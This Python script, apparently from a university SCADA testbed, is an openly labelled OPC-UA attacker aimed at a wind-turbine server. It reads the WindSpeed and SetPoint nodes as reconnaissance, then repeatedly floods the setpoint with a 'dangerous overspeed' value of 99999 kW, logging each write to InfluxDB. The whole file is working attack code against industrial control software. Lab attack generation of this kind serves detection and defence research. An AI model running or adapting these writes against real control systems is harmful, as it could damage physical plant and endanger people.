import asyncio
import time
from asyncua import Client
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

INFLUX_URL = "http://influxdb:8086"
INFLUX_TOKEN = "scada-token-123"
INFLUX_ORG = "scada-lab"
INFLUX_BUCKET = "scada-metrics"

_influx = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
_write_api = _influx.write_api(write_options=SYNCHRONOUS)


def push_metric(action, field_name, value):
    try:
        point = (
            Point("opcua")
            .tag("container", "opcua-attacker")
            .tag("action", action)
            .field(field_name, float(value))
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
    except Exception as e:
        print(f"InfluxDB write error: {e}")


async def run_opcua_attacker():
    url = "opc.tcp://opcua-server:4840/freeopcua/server/"
    
    retries = 0
    while retries < 20:
        try:
            async with Client(url=url) as client:
                print(f"[Attacker] Connected to OPC-UA Server at {url}")
                
                uri = "http://scada.hcmut.edu.vn"
                idx = await client.get_namespace_index(uri)
                
                # Get nodes for reconnaissance and attack
                wind_speed_node = await client.nodes.root.get_child(
                    ["0:Objects", f"{idx}:Turbine", f"{idx}:WindSpeed"]
                )
                setpoint_node = await client.nodes.root.get_child(
                    ["0:Objects", f"{idx}:Turbine", f"{idx}:Control", f"{idx}:SetPoint"]
                )
                
                while True:
                    print("\n--- START ATTACK CAMPAIGN ---")
                    
                    # Phase 1: Reconnaissance - read current values
                    print("[PHASE 1] Reconnaissance: reading turbine data...")
                    try:
                        wind_speed = await wind_speed_node.read_value()
                        setpoint = await setpoint_node.read_value()
                        print(f" [+] WindSpeed: {wind_speed}")
                        print(f" [+] SetPoint: {setpoint}")
                        push_metric("attack_recon", "wind_speed", wind_speed)
                        push_metric("attack_recon", "setpoint", setpoint)
                        recon_ok = True
                    except Exception as e:
                        print(f" Recon exception: {e}")
                        recon_ok = False
                    
                    await asyncio.sleep(2)
                    
                    # Phase 2: Attack - set dangerous SetPoint value (9999 kW - overspeed)
                    if recon_ok:
                        print("\n[PHASE 2] Flood attack: send dangerous SetPoint (99999 kW) 100 times...")
                        success_count = 0
                        malicious_setpoint = 99999.0  # Dangerous overspeed value
                        
                        for i in range(100):
                            try:
                                start_time = time.time()
                                await setpoint_node.write_value(malicious_setpoint)
                                latency = (time.time() - start_time) * 1000  # ms
                                
                                push_metric("write", "latency", latency)
                                push_metric("write", "node_value", malicious_setpoint)
                                
                                success_count += 1
                                await asyncio.sleep(0.05)
                            except Exception as e:
                                print(f" Write error at attempt {i + 1}: {e}")
                        
                        print(f" [+] Phase 2 complete. Successful writes: {success_count}/100")
                        print("--- END ATTACK CAMPAIGN. WAIT 30 SECONDS ---\n")
                        await asyncio.sleep(30)
                    else:
                        print(" [!] Skipping Phase 2 due to failed reconnaissance.")
                        print(" [+] Reattempting attack campaign after 15 seconds...\n")
                        await asyncio.sleep(15)
                        
        except Exception as e:
            retries += 1
            print(f"[Attacker] Connection failed: {e}. Retry {retries}/20...")
            await asyncio.sleep(3)
    
    print("[Attacker] Connection timeout. Exiting.")


if __name__ == "__main__":
    asyncio.run(run_opcua_attacker())
